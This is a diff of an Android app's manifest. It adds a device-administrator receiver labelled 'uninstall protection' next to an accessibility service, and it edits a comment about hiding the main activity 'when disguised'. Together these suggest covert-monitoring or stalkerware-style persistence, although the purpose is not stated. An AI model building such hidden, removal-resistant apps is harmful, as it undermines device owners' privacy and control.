@@ -13,7 +13,7 @@
         android:supportsRtl="true"
         android:theme="@style/Theme.AppCompat.Light.NoActionBar">
 
-        <!-- Main Default Activity (Hidden when disguised) -->
+        <!-- Main Default Activity -->
         <activity
             android:name=".MainActivity"
             android:exported="true"
@@ -77,6 +77,19 @@
                 android:name="android.accessibilityservice.accessibility_service_config"
                 android:resource="@xml/accessibility_service_config" />
         </service>
+
+        <!-- Device Administrator Receiver for Uninstall Protection -->
+        <receiver
+            android:name=".MyDeviceAdminReceiver"
+            android:exported="true"
+            android:permission="android.permission.BIND_DEVICE_ADMIN">
+            <meta-data
+                android:name="android.app.device_admin"
+                android:resource="@xml/device_admin_receiver" />
+            <intent-filter>
+                <action android:name="android.app.action.DEVICE_ADMIN_ENABLED" />
+            </intent-filter>
+        </receiver>
 
     </application>
 
